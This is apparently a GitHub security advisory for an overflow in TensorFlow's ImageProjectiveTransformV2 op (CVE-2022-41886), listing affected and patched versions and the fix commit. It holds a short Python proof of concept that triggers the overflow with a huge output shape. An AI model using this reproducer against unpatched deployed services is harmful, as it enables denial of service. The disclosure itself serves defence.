# Overflow in `ImageProjectiveTransformV2`

Low

[pak-laura](/pak-laura)
published
GHSA-54pp-c6pp-7fpx
Nov 18, 2022

## Package

pip

tensorflow, tensorflow-cpu, tensorflow-gpu
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.11.0

## Patched versions

2.8.4, 2.9.3, 2.10.1, 2.11.0

## Description

### Impact

When [`tf.raw_ops.ImageProjectiveTransformV2`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/image_ops.cc) is given a large output shape, it overflows.

```
import tensorflow as tf

interpolation = "BILINEAR"
fill_mode = "REFLECT"
images = tf.constant(0.184634328, shape=[2,5,8,3], dtype=tf.float32)
transforms = tf.constant(0.378575385, shape=[2,8], dtype=tf.float32)
output_shape = tf.constant([1879048192,1879048192], shape=[2], dtype=tf.int32)
tf.raw_ops.ImageProjectiveTransformV2(images=images, transforms=transforms, output_shape=output_shape, interpolation=interpolation, fill_mode=fill_mode)
```
### Patches

We have patched the issue in GitHub commit [8faa6ea692985dbe6ce10e1a3168e0bd60a723ba](https://github.com/tensorflow/tensorflow/commit/8faa6ea692985dbe6ce10e1a3168e0bd60a723ba).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.

### For more information

Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution

This vulnerability has been reported by Neophytos Christou from the Secure Systems Lab (SSL) at Brown University.

### Severity

Low

### CVE ID

CVE-2022-41886

### Weaknesses

No CWEs
